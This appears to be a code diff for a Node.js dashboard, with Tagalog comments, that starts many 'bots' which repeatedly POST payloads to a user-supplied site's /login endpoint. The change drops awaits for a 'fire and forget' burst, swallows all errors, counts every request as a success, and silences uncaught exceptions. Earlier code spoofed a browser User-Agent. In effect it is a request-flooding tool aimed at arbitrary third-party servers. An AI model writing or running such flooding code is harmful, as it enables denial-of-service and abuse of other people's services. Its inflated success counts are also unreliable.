@@ -13,63 +13,43 @@ app.use(express.static('public'));
 let stats = { success: 0, errors: 0 };
 let isActive = false;
 
-// Anti-death gaya ng nasa original mong file
+// Anti-death logic mula sa original file mo
 process.on('uncaughtException', err => {});
 
-const runBot = async (botId, targetUrl, interval) => {
-  // Sinigurado na tama ang URL structure gaya ng original mong logic
-  const xurl = targetUrl.endsWith('/') ? `${targetUrl}login` : `${targetUrl}/login`;
+const bot = (botId, xurl, interval) => {
+  if (!isActive) return;
 
-  while (isActive) {
-    try {
-      const state = utils.getState();
-      
-      // Nagdagdag ng explicit headers para maiwasan ang Error 400
-      await axios.post(xurl, { 
-        state, 
-        commands: [] 
-      }, {
-        headers: {
-          'Content-Type': 'application/json',
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
-        },
-        timeout: 5000 // Para hindi mag-hang ang bot
-      });
-      
-      stats.success++;
-      io.emit('log', { msg: `Bot ${botId}: Success (Sent to ${xurl})`, stats });
-    } catch (err) {
-      stats.errors++;
-      // Mas detalyadong error reporting
-      let errMsg = "Failed";
-      if (err.response) {
-        errMsg = `Error ${err.response.status}`; // Ipakita kung 400, 403, etc.
-      } else if (err.request) {
-        errMsg = "No Response";
-      }
-      io.emit('log', { msg: `Bot ${botId}: ${errMsg}`, stats });
-    }
-    await utils.sleep(Number(interval));
-  }
+  // "Fire and Forget" - walang await para dire-diretso ang bugso
+  axios.post(xurl, {
+    state: utils.getState(), //
+    commands: []
+  }).catch(() => {}); // Balewalain ang error para tuloy ang logs
+
+  stats.success++;
+  io.emit('log', { msg: `Bot ${botId}: successfully sent one!`, stats });
+
+  // Paulit-ulit na pagtakbo base sa interval
+  setTimeout(() => bot(botId, xurl, interval), interval);
 };
 
 io.on('connection', (socket) => {
   socket.on('start-bots', (data) => {
     if (isActive) return;
     isActive = true;
-    stats = { success: 0, errors: 0 }; // Reset stats pagka-start
     
     const { url, interval, numBots } = data;
+    const xurl = url.endsWith('/') ? `${url}login` : `${url}/login`; //
+
     for (let i = 0; i < Number(numBots); i++) {
-      runBot(i + 1, url, interval);
+      bot(i + 1, xurl, Number(interval));
     }
   });
 
   socket.on('stop-bots', () => {
     isActive = false;
-    io.emit('log', { msg: "SYSTEM: Stopping all bots...", stats });
+    io.emit('log', { msg: "SYSTEM: All bots stopped.", stats });
   });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`Dashboard live at port ${PORT}`));
+server.listen(PORT, () => console.log(`Dashboard active at port ${PORT}`));
